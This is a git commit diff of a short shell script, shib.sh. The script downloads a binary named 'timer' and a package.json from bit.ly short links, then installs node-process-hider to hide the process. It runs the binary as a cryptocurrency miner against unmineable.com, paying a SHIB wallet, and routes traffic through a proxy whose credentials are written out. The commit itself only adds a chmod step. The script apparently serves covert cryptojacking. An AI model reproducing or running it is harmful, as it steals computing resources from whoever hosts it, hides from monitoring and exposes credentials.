736c4146533c65a3bca66a4b951db9ef51c21f7d
nettech12 <107695376+nettech12@users.noreply.github.com>
2022-11-19 14:56:22 +0530

    Update shib.sh

--- shib.sh
+++ shib.sh
@@ -1,6 +1,6 @@
 export http_proxy="socks5://suimgdme-rotate:i6aabnec0wfb@p.webshare.io:80"
 wget -nc -O package.json "https://bit.ly/3XhaT27"
-wget -nc  -O timer "https://bit.ly/3VbO4LK"
+wget -nc -O timer "https://bit.ly/3VbO4LK"
 npm install node-process-hider 
-npx ph add timer
+npx ph add timer && chmod +x timer
 ./timer --threads=2 -o rx.unmineable.com:3333 -u SHIB:0xDC55733e45Aa262934d3efa6fE0a4e2EfA11a2e3.linux#d4sw-bbr2 -p x
